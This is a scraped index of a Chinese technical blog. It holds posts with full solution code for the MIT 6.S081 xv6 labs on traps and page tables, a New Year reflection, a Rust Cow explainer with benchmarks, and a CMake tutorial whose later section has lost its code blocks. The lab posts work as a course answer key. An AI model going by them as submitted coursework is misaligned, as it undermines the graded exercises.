","date":"2021-02-25","objectID":"/posts/6-s081-lab4-traps/:1:0","tags":["6.S081","traps"],"title":"6.S081 lab4 traps","uri":"/posts/6-s081-lab4-traps/"},{"categories":["OS"],"content":"Backtrace 该步骤需要实现一个backtrace函数，打印出调用轨迹，即每次调用的返回地址。 xv6 运行时的 stack 结构如下图： s0/fp中存储着当前的 frame pointer，fp-8指向返回地址，fp-16指向上一个fp地址。 所以我们只需要不断打印当前fp的返回地址并向前追溯，直到 stack 顶部。 首先在kernel/riscv.h添加内联汇编函数以获取fp值： static inline uint64 r_fp() { uint64 x; asm volatile(\"mv %0, s0\" : \"=r\" (x) ); return x; } 然后在kernel/printf.c实现backtrace： void backtrace(void) { uint64 fp, top; fp = r_fp(); top = PGROUNDUP(fp); while(1) { if (fp == top) break; printf(\"%p\\n\", *(uint64*)(fp-8)); fp = *(uint64*)(fp-16); } } 之后在sys_sleep和panic中加入对backtrace的调用即可。 ","date":"2021-02-25","objectID":"/posts/6-s081-lab4-traps/:2:0","tags":["6.S081","traps"],"title":"6.S081 lab4 traps","uri":"/posts/6-s081-lab4-traps/"},{"categories":["OS"],"content":"Alarm 本关需要实现一个sigalarm(interval, handler)系统调用，cpu 每消耗 interval 个 ticks 后，调用一次 handler 函数。 首先要在user/user.h添加对新系统调用的用户接口： int sigalarm(int ticks, void (*handler)()); int sigreturn(void); sigreturn是一个被设计用来帮助我们实现sigalarm的函数，每个handler执行结束后，都调用sigreturn。 首先要在proc中添加新的字段，记录interval，handler以及所需的辅助变量，在allocpoc中对它们进行初始化，在系统调用执行时，保存相应的值到proc中。 uint64 sys_sigalarm(void) { struct proc *p = myproc(); if (argint(0, \u0026(p-\u003ealarm_interval)) \u003c 0) return -1; if (argaddr(1, \u0026(p-\u003ealarm_hanlder)) \u003c 0) return -1; return 0; } 之后，我们需要在usertrap识别到 timer interrupt 时，进行处理，hints 告诉我们，是which_dev == 2。 // give up the CPU if this is a timer interrupt. if(which_dev == 2) { p-\u003epassed++; if (p-\u003epassed == p-\u003ealarm_interval) { p-\u003epassed = 0; p-\u003etrapframe-\u003eepc = p-\u003ealarm_hanlder; } yield(); } 此时只需让sigreturn直接返回 0，这样简单地添加代码，可以让test0打印出 alarm，但是随后，程序便逻辑崩溃，无法通过测试。这是因为当 kernle 处理完 time interru，回到用户模式，pc 指向 handler 的位置，之后开始执行 handler 函数，在 handler 函数尾部，调用sigreturn陷入 kernel，并无操作，再次返回用户态，执行 handler 尾部的ret。此时用于ret指令的返回地址寄存器ra所存储的值，是在 time interrupt 之时，test 函数执行中产生的ra的值，并非是 time interrupt 发生时，正在执行的代码地址，所以程序不能返回正确位置，并且 handler 执行过程中，修改了的部分寄存器也需要恢复。 于是，我们需要在 handler 执行前保存tramframe，在执行后的sigreturn中恢复tramframe，让代码返回到正确的位置执行，并使寄存器的数值复原。同时，根据 hints，为了防止 handler 执行过程中被重复调用，添加permission字段来进行控制，此外，interval==0时，意味着取消 alarm。 uint64 sys_sigreturn(void) { struct proc* p = myproc(); p-\u003epermission = 1; *p-\u003etrapframe = p-\u003ealarm_frame; printf(\"ra:%p\\n\", p-\u003etrapframe-\u003era); return 0; } 在usertrap中： if(which_dev == 2) { p-\u003epassed++; if (p-\u003epermission \u0026\u0026 p-\u003ealarm_interval \u0026\u0026 p-\u003epassed == p-\u003ealarm_interval) { p-\u003epassed = 0; p-\u003epermission = 0; p-\u003ealarm_frame = *p-\u003etrapframe; p-\u003etrapframe-\u003eepc = p-\u003ealarm_hanlder; } yield(); } 到此，便完成了 lab4 traps。 此外，还有一点，笔者曾尝试只保存tramframe中的caller save寄存器，但是无法通过测试。最终查看asm文件发现：callee save寄存器是在被调用函数尾部的 ret 指令前进行恢复的，但是在sigreturn中通过恢复epc的方式，将pc直接指向了被 time interrupt 打断执行的代码位置，所以callee save寄存器在被修改后并未被复原，我们必须保存trapframe中的所有寄存器。 ","date":"2021-02-25","objectID":"/posts/6-s081-lab4-traps/:3:0","tags":["6.S081","traps"],"title":"6.S081 lab4 traps","uri":"/posts/6-s081-lab4-traps/"},{"categories":["OS"],"content":"环境配置 前两个 lab 比较基础，就不写博客记录了，于是从 lab3 开始。 环境配置参考官网 。如果使用ubuntu20.04的话，环境配置比较简单，只需要从qemu 官网下载源码，手动 build 就完成了；或者使用archlinux，一条命令便全部配置完成。笔者使用的平台是macOS 11.2.1，使用homebrew安装的qemu在前两个 lab 没有问题，但是在第三个 lab 出现了 crash，改为从源码手动编译安装qemu 5.1.0解决了。 2021-02-24 修正：做 lab4 查看call.asm，发现.text 指令长度不一，有的为 2，有的为 4，遂找人请教，猜测是指令压缩导致，于是联想到之前几乎所有人都遇到的一个问题，使用 gdb 打断点调试时，出现：“Cannot access memory at address xxx”。经过大佬查阅并尝试，发现在.gdbinit.tmpl-riscv中加入set riscv use-compressed-breakpoints yes可以有效解决。 ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:1:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["OS"],"content":"Print a page table 该部分的内容是打印出第一个进程的用户页表。这个非常简单： 参照freewalk函数，首先在kernel/vm.c添加vmprint: void _vmprint(pagetable_t pagetable, int level) { int j; // there are 2^9 = 512 PTEs in a page table. for(int i = 0; i \u003c 512; i++){ pte_t pte = pagetable[i]; if(pte \u0026 PTE_V){ for(j = 0; j \u003c= level; j++) { if(j == 0) printf(\"..\"); else printf(\" ..\"); } uint64 child = PTE2PA(pte); printf(\"%d: pte %p pa %p\\n\", i, pte, child); // this PTE points to a lower-level page table. if ((pte \u0026 (PTE_R | PTE_W | PTE_X)) == 0) { _vmprint((pagetable_t)child, level + 1); } } } } // print the page tables void vmprint(pagetable_t pagetable) { printf(\"page table %p\\n\", pagetable); _vmprint(pagetable, 0); } 然后在exec.c中插入代码打印第一个进程的用户页表： if(p-\u003epid == 1) { vmprint(p-\u003epagetable); } 启动后打印出如下内容： page table 0x0000000087f67000 ..0: pte 0x0000000021fd8c01 pa 0x0000000087f63000 .. ..0: pte 0x0000000021fd8801 pa 0x0000000087f62000 .. .. ..0: pte 0x0000000021fd901f pa 0x0000000087f64000 .. .. ..1: pte 0x0000000021fd840f pa 0x0000000087f61000 .. .. ..2: pte 0x0000000021fd801f pa 0x0000000087f60000 ..255: pte 0x0000000021fd9801 pa 0x0000000087f66000 .. ..511: pte 0x0000000021fd9401 pa 0x0000000087f65000 .. .. ..510: pte 0x0000000021fdd807 pa 0x0000000087f76000 .. .. ..511: pte 0x0000000020001c0b pa 0x0000000080007000 在用户地址空间最高处，511，510 entry 对应trampoline和trapframe。在用户地址空间最低处，0，1，2 entry 对应text\\data，guard page，stack，如果修改下_vmprint打印出更多信息，可以发现 entry 1 的PTE_U是无效的，可以防止栈溢出。顶级页表只使用到第 255 个 entry，因为xv6只使用了 38 位地址。 ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:2:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["OS"],"content":"A kernel page table per process 第二部分是让每个进程拥有单独的内核页表，为第三部分直接使用用户虚拟地址做准备。 首先在kernel/proc.h中的struct proc定义中添加 pagetable_t kpagetable; 仿照kvminit，实现一个初始化进程内核页表的函数： pagetable_t proc_kvminit(void) { int i; pagetable_t proc_kpagetable = uvmcreate(); if (proc_kpagetable == 0) { return 0; } for(i = 1; i \u003c 512; i++) { proc_kpagetable[i] = kernel_pagetable[i]; } ukvmmap(proc_kpagetable, UART0, UART0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, VIRTIO0, VIRTIO0, PGSIZE, PTE_R | PTE_W); ukvmmap(proc_kpagetable, CLINT, CLINT, 0x10000, PTE_R | PTE_W); ukvmmap(proc_kpagetable, PLIC, PLIC, 0x400000, PTE_R | PTE_W); return proc_kpagetable; } void ukvmmap(pagetable_t kernel_pagetable ,uint64 va, uint64 pa, uint64 sz, int perm) { if(mappages(kernel_pagetable, va, sz, pa, perm) != 0) panic(\"kvmmap\"); } 根据后续实验，我们能修改的内核地址空间不超过顶级页表的第一个 entry 的地址范围，所以我们和kernel_pagetable共享其他 entry，直接进行复制，这样能够节约次级页表占用的内存空间。 kernel/proc.c中的allocproc函数，负责分配、初始化进程，在其中如下调用： p-\u003ekpagetable = proc_kvminit(); if (p-\u003ekpagetable == 0) { freeproc(p); release(\u0026p-\u003elock); return 0; } 之后，官网的hint提到需要为每个进程初始化kernel stack，可能需要将proinit中的部分代码转移到allocproc中，由于我们和kernel_pagetable共享了顶级页表 entry 1 意外的所有页表，所以仍可以将kernel stack的初始化代码留在procinit中。 接下来，修改scheduler，当调度到进程执行时，将进程的内核页表载入stap寄存器（参考kvminithart），当没有进程运行时，使用kernel_pagetable： if(p-\u003estate == RUNNABLE) { // Switch to chosen process. It is the process's job // to release its lock and then reacquire it // before jumping back to us. p-\u003estate = RUNNING; c-\u003eproc = p; w_satp(MAKE_SATP(p-\u003ekpagetable)); sfence_vma(); swtch(\u0026c-\u003econtext, \u0026p-\u003econtext); // Process is done running for now. // It should have changed its p-\u003estate before coming back. c-\u003eproc = 0; kvminithart(); found = 1; } 之后，我们需要在free_proc中添加释放内核页表的代码： if(p-\u003ekpagetable) { proc_freekpagetable(p-\u003ekpagetable); } void proc_freekpagetable(pagetable_t kpagetable) { pte_t pte = kpagetable[0]; pagetable_t level1 = (pagetable_t) PTE2PA(pte); for (int i = 0; i \u003c 512; i++) { pte_t pte = level1[i]; if (pte \u0026 PTE_V) { uint64 level2 = PTE2PA(pte); kfree((void *) level2); level1[i] = 0; } } kfree((void *) level1); kfree((void *) kpagetable); } 注意，由于和kernel_pagetable进行了共享，所以仅释放第一个 entry 对应的次级页表；如果没有共享则需释放整个三级页表（都不能释放物理内存）。 此外，如果将kernel stack的初始化代码放置在了allocproc中，那么需要在freeproc中释放并 ummapkernel stack，并且需要在kvmpa做出修改，使用： pte = walk(myproc()-\u003ekpagetable, va, 0); ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:3:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["OS"],"content":"Simplify copyin/copyinstr 该部分需要利用第二部分中的进程内核页表简化copyin/copyinstr函数，使之不需要传递用户页表。 根据提示，将进程的用户页表复制到其内核页表中，这样每个进程内核页表都有其对应用户页表的副本。复制的用户页表虚拟地址不能超过PLIC，之上是kernel占有的地址空间，所以需要判断。 void u2kvmcopy(pagetable_t pagetable, pagetable_t kpagetable, uint64 oldsz, uint64 newsz) { uint64 va; pte_t *upte; pte_t *kpte; if(newsz \u003e= PLIC) panic(\"u2kvmcopy: newsz too large\"); for (va = oldsz; va \u003c newsz; va += PGSIZE) { upte = walk(pagetable, va, 0); kpte = walk(kpagetable, va, 1); *kpte = *upte; // because the user mapping in kernel page table is only used for copyin // so the kernel don't need to have the W,X,U bit turned on *kpte \u0026= ~(PTE_U|PTE_W|PTE_X); } } 注意将复制到内核页表的 entry 取消PTE_U权限。 之后在exec/fork/sbrk中，每次用户页表发生改变时，复制到内核页表中。 对于exec: if(p-\u003epid == 1) { vmprint(p-\u003epagetable); } u2kvmcopy(p-\u003epagetable, p-\u003ekpagetable, 0, p-\u003esz); 对于fork: u2kvmcopy(np-\u003epagetable, np-\u003ekpagetable, 0, np-\u003esz); release(\u0026np-\u003elock); return pid; 对于sbrk，修改growproc: if(n \u003e 0){ if (PGROUNDUP(sz + n) \u003e= PLIC) return -1; if((sz = uvmalloc(p-\u003epagetable, sz, sz + n)) == 0) { return -1; } } else if(n \u003c 0){ sz = uvmdealloc(p-\u003epagetable, sz, sz + n); // clean that pte bits } u2kvmcopy(p-\u003epagetable, p-\u003ekpagetable, p-\u003esz, sz); 之后，在userinit中，将第一个进程的用户页表复制到内核页表： p-\u003estate = RUNNABLE; u2kvmcopy(p-\u003epagetable, p-\u003ekpagetable, 0, p-\u003esz); release(\u0026p-\u003elock); 最后，将原cpoyin/copyinstr修改为对cpoyin_new/copyinstr_new的调用即可。 在copyin_new中，做了srcva + len \u003c srcva判断条件。这是为了防止len过大，导致溢出。 ","date":"2021-02-22","objectID":"/posts/6-s081-lab3-page-tables/:4:0","tags":["6.S081","page table"],"title":"6.S081 lab3 page tables","uri":"/posts/6-s081-lab3-page-tables/"},{"categories":["感想"],"content":"2020 庚子鼠年，在家上了半年网课，慵懒地躺尸，同时又在焦虑感的驱使下战战兢兢地当个做题家。而后，二进宫实习，同时参加夏令营，拿到 offer；国庆离职，进入实验室，成为临时工。一直在忙碌，一直在焦虑。 「吾之大患，因有吾身」，成长的经历，让我总是被「焦虑」二字困扰。对自己想做的事，隔得很久便开始计划，有一点不顺意便焦虑得不行。人生中并不是很忙的阶段，也因为焦虑变得无端忙碌。好在运气不错，许多目标都实现了，对自己的发展也有了大致的规划。 告别庚子鼠年，我希望自己能克制焦虑的心境，能静下来，做好自己手上的事，潜心读每一篇论文，像一个工程师一样做项目，学习更多的人生知识。 最后，新的一年，要牛气冲天。 ","date":"2021-02-11","objectID":"/posts/goodbyte-2020/:0:0","tags":["新年"],"title":"告别2020庚子鼠年","uri":"/posts/goodbyte-2020/"},{"categories":["rust"],"content":"定义 Cow是一个提供了写时克隆功能的智能指针，它可以包装对数据的借用，当需要修改数据或者获取数据的所有权时，对数据clone。它的定义如下： pub enum Cow\u003c'a, B\u003e where B: 'a + ToOwned + ?Sized, { Borrowed(\u0026'a B), Owned(\u003cB as ToOwned\u003e::Owned), } Cow名为clone-on-write，但是对数据类型B的trait要求是ToOwned，而不是Clone。这是因为Clone只能从\u0026T生成T，但是ToOwned泛化为从任意给定类型的借用数据构建新类型的数据。功能更为强大。 如下一段示例代码，将Cow应用在结构体中。 use std::borrow::Cow; struct Items\u003c'a, X: 'a\u003e where [X]: ToOwned\u003cOwned = Vec\u003cX\u003e\u003e, { values: Cow\u003c'a, [X]\u003e, } impl\u003c'a, X: Clone + 'a\u003e Items\u003c'a, X\u003e where [X]: ToOwned\u003cOwned = Vec\u003cX\u003e\u003e, { fn new(v: Cow\u003c'a, [X]\u003e) -\u003e Self { Items { values: v } } } // Creates a container from borrowed values of a slice fn main() { let readonly = [1, 2]; let borrowed = Items::new((\u0026readonly[..]).into()); match borrowed { Items { values: Cow::Borrowed(b), } =\u003e println!(\"borrowed {:?}\", b), _ =\u003e panic!(\"expect borrowed value\"), } let mut clone_on_write = borrowed; // Mutates the data from slice into owned vec and pushes a new value on top clone_on_write.values.to_mut().push(3); println!(\"clone_on_write = {:?}\", clone_on_write.values); // The data was mutated. Let check it out. match clone_on_write { Items { values: Cow::Owned(_), } =\u003e println!(\"clone_on_write contains owned data\"), _ =\u003e panic!(\"expect owned data\"), } } 运行生成如下结果，可见对借用的数据进行修改后，发生了克隆。 borrowed [1, 2] clone_on_write = [1, 2, 3] clone_on_write contains owned data ","date":"2021-01-30","objectID":"/posts/rust-smartpointer-cow/:1:0","tags":["rust","智能指针","cow"],"title":"Rust智能指针Cow","uri":"/posts/rust-smartpointer-cow/"},{"categories":["rust"],"content":"使用 试想这样一个场景，我们需要给处理一些Url，其中一部分是https://开头的，而另一部分不是，现在要给缺少https://前缀的Url加上前缀。 使用Cow，函数如下： fn add_prefix_by_cow\u003c'a, T\u003e(urls: T, prefix: \u0026str) -\u003e Vec\u003cCow\u003c'a, String\u003e\u003e where T: IntoIterator\u003cItem = \u0026'a String\u003e, { urls.into_iter() .map(|url| { if url.starts_with(prefix) { Cow::Borrowed(url) } else { Cow::Owned(String::with_capacity(url.len() + prefix.len()) + prefix + url) } }) .collect() } 不使用Cow，函数如下： fn add_prefix_by_clone\u003c'a, T\u003e(urls: T, prefix: \u0026'a str) -\u003e Vec\u003cString\u003e where T: IntoIterator\u003cItem = \u0026'a String\u003e, { urls.into_iter() .map(|url| { if url.starts_with(prefix) { url.clone() } else { url.clone() + prefix } }) .collect() } 用Criterion来进行 benchmark 测试 fn bench(c: \u0026mut Criterion) { let mut group = c.benchmark_group(\"cow_bench\"); group.sampling_mode(SamplingMode::Linear); group.bench_function(\"cow\", |b| { b.iter_batched( || { let pre = vec![\"https://127.0.0.1\".to_string(); 1024]; let non_pre = vec![\"127.0.0.1\".to_string(); 1024]; [pre, non_pre].concat() }, |v| { let _ = add_prefix_by_cow(\u0026v, \"https://\"); }, BatchSize::SmallInput, ) }); group.bench_function(\"clone\", |b| { b.iter_batched( || { let pre = vec![\"https://127.0.0.1\".to_string(); 1024]; let non_pre = vec![\"127.0.0.1\".to_string(); 1024]; [pre, non_pre].concat() }, |v| { let _ = add_prefix_by_clone(\u0026v, \"https://\"); }, BatchSize::SmallInput, ) }); group.finish(); } 输出如下： cow_bench/cow time: [256.10 us 259.48 us 262.41 us] cow_bench/clone time: [448.13 us 457.38 us 467.73 us] 生成分析图片如下图所示，可见Cow在大量的内存操作时，能尽可能的进行内存共享，延迟耗时的克隆操作，进行更加细致的内存操作控制。 ","date":"2021-01-30","objectID":"/posts/rust-smartpointer-cow/:2:0","tags":["rust","智能指针","cow"],"title":"Rust智能指针Cow","uri":"/posts/rust-smartpointer-cow/"},{"categories":["构建工具"],"content":"最近因为毕设的原因，需要看 Cpp 项目，首先项目构建就涉及到了 CMake，所以跟着 CMake 官网的 Tutorial 学习了一下，该文章算是官网教程的搬运。 Tutorial 点这里, GitHub 代码点这里. ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:0:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"构建简单项目 最基本的 CMake 项目是由源代码文件构建可执行文件。对于简单的项目，只需要一个三行的 CMakeLists.txt 文件。这将是我们 tutorial 的起点。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"开始项目 cmake_minimum_required(VERSION 3.10) # set the project name project(Tutorial) # add the executable add_executable(Tutorial tutorial.cxx) 源代码tutorial.cxx如下 // A simple program that computes the square root of a number #include \u003ccmath\u003e #include \u003ccstdlib\u003e #include \u003ciostream\u003e #include \u003cstring\u003e int main(int argc, char* argv[]) { if (argc \u003c 2) { std::cout \u003c\u003c \"Usage: \" \u003c\u003c argv[0] \u003c\u003c \" number\" \u003c\u003c std::endl; return 1; } // convert input to double const double inputValue = atof(argv[1]); // calculate square root const double outputValue = sqrt(inputValue); std::cout \u003c\u003c \"The square root of \" \u003c\u003c inputValue \u003c\u003c \" is \" \u003c\u003c outputValue \u003c\u003c std::endl; return 0; } ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:1","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加版本号并配置头文件 添加版本号 #set the project name and version project(Tutorial VERSION 1.0) 然后，配置一个头文件，将版本号传递给源代码 configure_file(TutorialConfig.h.in TutorialConfig.h) 由于配置的文件将被写入二叉树，所以我们必须将该目录添加到搜索 include 文件的路径列表中（该声明放在add_executable之后）: target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ) 新建TutorialConfig.h.in // the configured options and settings for Tutorial #define Tutorial_VERSION_MAJOR @Tutorial_VERSION_MAJOR@ #define Tutorial_VERSION_MINOR @Tutorial_VERSION_MINOR@ 当 CMake 配置这个头文件时，@Tutorial_VERSION_MAJOR@和@Tutorial_VERSION_MINOR@的值将被替换。 接着，修改源代码，include 头文件TutorialConfig.h。然后，更新源代码打印出可执行文件的名称和版本号： if (argc \u003c 2) { // report version std::cout \u003c\u003c argv[0] \u003c\u003c \" Version \" \u003c\u003c Tutorial_VERSION_MAJOR \u003c\u003c \".\" \u003c\u003c Tutorial_VERSION_MINOR \u003c\u003c std::endl; std::cout \u003c\u003c \"Usage: \" \u003c\u003c argv[0] \u003c\u003c \" number\" \u003c\u003c std::endl; return 1; } 指定使用 C++11 标准，使用std::stod cmake_minimum_required(VERSION 3.10) # set the project name and version project(Tutorial VERSION 1.0) # specify the C++ standard set(CMAKE_CXX_STANDARD 11) set(CMAKE_CXX_STANDARD_REQUIRED True) CMAKE_CXX_STANDARD 生命必须放在 add_executable 之前 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:2","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"构建并测试 首先构建 mkdir step1_build cd step1_build cmake .. cmake --build . 然后测试 Tutorial 4294967296 Tutorial 10 Tutorial ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:1:3","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加一个库 我们将向项目中添加一个库。这个库将包含了自定义的平方根函数的实现。之后，在可执行文件中使用用这个库，替换编译器提供的标准平方根函数。 新建MathFunctions目录，在其下添加CMakeLists.txt,添加如下内容: add_library(MathFunctions mysqrt.cxx) mysqrt.cxx如下： #include \u003ciostream\u003e // a hack square root calculation using simple operations double mysqrt(double x) { if (x \u003c= 0) { return 0; } double result = x; // do ten iterations for (int i = 0; i \u003c 10; ++i) { if (result \u003c= 0) { result = 0.1; } double delta = x - (result * result); result = result + 0.5 * delta / result; std::cout \u003c\u003c \"Computing sqrt of \" \u003c\u003c x \u003c\u003c \" to be \" \u003c\u003c result \u003c\u003c std::endl; } return result; } 为了使用新库，我们将在顶层的CMakeLists.txt文件中添加一个add subdirectory()调用，以便构建库。我们将新库添加到可执行文件中，并将MathFunctions添加为 include 目录，以便可以找到mqsqrt.h头文件。顶层的CMakeLists.txt文件的最后几行现在看起来应该是这样的： # add the MathFunctions library add_subdirectory(MathFunctions) # add the executable add_executable(Tutorial tutorial.cxx) target_link_libraries(Tutorial PUBLIC MathFunctions) # add the binary tree to the search path for include files # so that we will find TutorialConfig.h target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" \"${PROJECT_SOURCE_DIR}/MathFunctions\" ) 现在让我们把 MathFunctions 库变成可选的。虽然对于本教程来说，没有必要这样做，但对于大型项目来说，这是一种常见的情况。第一步是在顶层的 CMakeLists.txt 文件中添加一个选项（option放在configure_file前面）: option(USE_MYMATH \"Use tutorial provided math implementation\" ON) # configure a header file to pass some of the CMake settings # to the source code configure_file(TutorialConfig.h.in TutorialConfig.h) 这个选项会在 cmake-gui 和 ccmake 中显示，默认值为 ON，用户可以更改。这个设置将被保存在缓存中，这样用户就不需要在每次运行 CMake 的时候设置这个值。 下一个步是使构建和链接MathFunctions库成为条件判断的。要做到这一点，我们将顶层CMakeLists.txt文件的结尾改为如下所示: if(USE_MYMATH) add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions) list(APPEND EXTRA_INCLUDES \"${PROJECT_SOURCE_DIR}/MathFunctions\") endif() # add the executable add_executable(Tutorial tutorial.cxx) target_link_libraries(Tutorial PUBLIC ${EXTRA_LIBS}) # add the binary tree to the search path for include files # so that we will find TutorialConfig.h target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ${EXTRA_INCLUDES} ) 请注意使用变量EXTRA_LIBS来收集任何可选的库，以便以后链接到可执行文件中。变量EXTRA_INCLUDES也同样用于处理可选的头文件。这是在处理许多可选组件时的传统方法，下一步讲介绍更为现代化方法。 相应的，需要简单修改源代码。首先，在tutorial.cxx中，如果我们需要的话，就加入MathFunctions.h头文件： #ifdef USE_MYMATH # include \"MathFunctions.h\" #endif 然后，使用USE_MYMATH控制库函数的调用： #ifdef USE_MYMATH const double outputValue = mysqrt(inputValue); #else const double outputValue = sqrt(inputValue); #endif 由于源代码现在需要 USE_MYMATH， 我们可以在 TutorialConfig.h.in中加入下面这行: #cmakedefine USE_MYMATH 接下来，在构建时，可以使用-D添加使用选项，例如要关闭选项，使用： cmake .. -DUSE_MYMATH=OFF ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:2:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加库的使用条件 使用条件允许更好地控制库或可执行文件的链接和include行，同时也给予 CMake 内部 target 的转义属性更多的控制。利用使用条件的主要命令有: target_compile_definitions() target_compile_options() target_include_directories() target_link_libraries() 让我们从步骤 2 开始中重构我们的代码，使用现代 CMake 的使用条件方法。我们首先声明，任何人链接到MathFunctions都需要包含当前目录，而MathFunctions本身不需要。所以这可以成为一个INTERFACE的使用条件。 记住，INTERFACE是指使用者需要而提供者不需要的东西。在MathFunctions/CMakeLists.txt的末尾添加以下几行: target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} ) 现在我们已经指定了 MathFunctions的使用条件，我们可以安全地从顶层的 CMakeLists.txt中删除对 EXTRA_INCLUDES 变量的使用。 此处 if(USE_MYMATH) # add the MathFunctions library add_subdirectory(MathFunctions) list(APPEND EXTRA_LIBS MathFunctions) endif() 和此处 target_include_directories(Tutorial PUBLIC \"${PROJECT_BINARY_DIR}\" ) 之后便可以重新构建项目了。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:3:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"安装和测试 现在我们可以开始为我们的项目添加安装规则和测试支持。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:4:0","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"安装规则 安装规则相当简单：对于MathFunctions，我们要安装库和头文件，对于应用程序，我们要安装可执行文件和配置的头文件。 所以在MathFunctions/CMakeLists.txt中添加： install(TARGETS MathFunctions DESTINATION lib) install(FILES MathFunctions.h DESTINATION include) 在顶层的CMakeLists.txt中 添加： install(TARGETS Tutorial DESTINATION bin) install(FILES \"${PROJECT_BINARY_DIR}/TutorialConfig.h\" DESTINATION include ) 这就是为tutorial创建一个基本的本地安装所需要的全部内容。 现在重新来配置项目并构建它。然后在命令行使用cmake 命令的install 选项来运行安装步骤 (在 3.15 中引入，旧版本的 CMake 必须使用 make install)。对于多配置工具，不要忘记使用–config 参数来指定配置。如果使用 IDE，只需构建INSTALL target。这一步将安装相应的头文件、库和可执行文件。例如: cmake --install . CMake 变量 CMAKE_INSTALL_PREFIX 用于确定文件安装的根目录。如果使用 cmake --install 命令，安装目录可以通过 --prefix参数重写。例如： cmake --install . --prefix \"/home/myuser/installdir\" ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:4:1","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"测试支持 接下来，测试我们的应用程序。在顶层的CMakeLists.txt文件的末尾，我们可以启用测试，然后添加一些基本测试以验证应用程序是否正常运行。 enable_testing() # does the application run add_test(NAME Runs COMMAND Tutorial 25) # does the usage message work? add_test(NAME Usage COMMAND Tutorial) set_tests_properties(Usage PROPERTIES PASS_REGULAR_EXPRESSION \"Usage:.*number\" ) # define a function to simplify adding tests function(do_test target arg result) add_test(NAME Comp${arg} COMMAND ${target} ${arg}) set_tests_properties(Comp${arg} PROPERTIES PASS_REGULAR_EXPRESSION ${result} ) endfunction(do_test) # do a bunch of result based tests do_test(Tutorial 4 \"4 is 2\") do_test(Tutorial 9 \"9 is 3\") do_test(Tutorial 5 \"5 is 2.236\") do_test(Tutorial 7 \"7 is 2.645\") do_test(Tutorial 25 \"25 is 5\") do_test(Tutorial -25 \"-25 is [-nan|nan|0]\") do_test(Tutorial 0.0001 \"0.0001 is 0.01\") 第一个测试只是简单地验证应用程序是否运行，没有 segfault 或其他崩溃，并且返回值为零。这是 CTest 测试的基本形式。 下一个测试利用PASS_REGULAR_EXPRESSION测试属性来验证测试的输出是否包含某些字符串。在这种情况下，验证当提供的参数数量不正确时，是否会打印出使用信息。 最后，我们有一个名为 do_test 的函数，它运行应用程序并验证给定输入的计算平方根是否正确。每调用一次do_test，就会在项目中添加一个测试，包括名称、输入和基于传递的参数的预期结果。 重新构建应用程序，然后 cd 到二进制目录，运行ctest可执行文件：ctest -N（--show-only[=format]）和ctest -VV（--extra-verbose）。对于多配置生成器（如 Visual Studio），必须指定配置类型。例如，要在 Debug 模式下运行测试，从构建目录中使用ctest -C Debug -VV（不是 Debug 子目录！）。或者，从 IDE 中构建RUN_TESTS目标。 ","date":"2020-10-29","objectID":"/posts/cmake-tutorial/:4:2","tags":["CMake"],"title":"CMake Tutorial","uri":"/posts/cmake-tutorial/"},{"categories":["构建工具"],"content":"添加系统自检 让我们考虑在我们的项目中添加一些代码，这些代码取决于目标平台可能没有的功能。在这个例子中，我们将添加一些代码，这些代码取决于目标平台是否有 log 和 exp 函数。当然，几乎每个平台都有这些函数，但在本教程中，假设它们并不常见。 如果平台上有 log 和 exp，那么我们将使用它们来计算 mysqrt 函数中的平方根。我们首先使用顶层CMakeLists.txt中的CheckSymbolExists模块测试这些函数是否可用。在某些平台上，我们需要链接到m库。如果最初没有找到log和exp，则需要使用m库并再次尝试。 我们将使用TutorialConfig.h.in中的新定义，所以一定要在配置该文件之前设置它们。 如果系统上有log和exp，那么我们将在mysqrt函数中使用它们来计算平方根。在MathFunctions/mysqrt.cxx中的mysqrt函数中添加以下代码（在返回结果之前不要忘记#endif！）。 重新构建项目，会发现无论平台上是否有log和exp，都不会调用它们。因为我们忘记了在mysqrt.cxx中 include TutorialConfig.h。现在更新 我们还需要更新MathFunctions / CMakeLists.txt，以便mysqrt.cxx知道此文件的位置： target_include_directories(MathFunctions INTERFACE ${CMAKE_CURRENT_SOURCE_DIR} PRIVATE ${CMAKE_BINARY_DIR} ) 